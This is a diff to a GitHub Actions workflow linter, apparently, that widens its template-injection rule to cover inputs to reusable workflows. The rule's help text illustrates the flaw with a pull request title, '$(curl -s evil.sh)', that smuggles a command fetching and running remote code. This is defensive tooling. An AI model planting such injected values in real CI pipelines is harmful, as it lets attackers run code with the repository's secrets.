@@ -407,13 +407,13 @@ RULES: tuple[Rule, ...] = (
     Rule(
         "WG004",
         "template-injection",
-        "Untrusted ${{ }} values (or a composite action's inputs) inside run: or github-script",
+        "Untrusted ${{ }} values (or inputs from unknown callers) inside run: or github-script",
         template_injection,
         help=(
             "${{ }} values are pasted into the script before it runs, so a pull request title like "
             '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
-            "script instead. In a composite action the same goes for ${{ inputs.* }}: the calling "
-            "workflow may pass untrusted text."
+            "script instead. In a composite action or reusable workflow the same goes for "
+            "${{ inputs.* }}: the calling workflow may pass untrusted text."
         ),
     ),
     Rule(
